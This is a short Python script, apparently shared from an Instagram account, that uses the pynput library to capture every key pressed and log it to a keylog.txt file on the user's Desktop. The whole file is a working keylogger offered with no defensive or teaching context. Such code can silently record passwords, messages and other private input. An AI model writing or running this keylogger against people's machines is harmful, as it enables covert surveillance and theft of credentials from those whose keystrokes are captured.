#instagram.com/machine_learning.teknoboost

from pynput.keyboard import Listener,Key 
import logging
log_directory=r"/home/whytedork/Desktop/"
logging.basicConfig(filename=(log_directory+"keylog.txt"),level=logging.DEBUG)

def on_press(key):
	logging.info(str(key))

with Listener(on_press = on_press) as listener :
	listener.join()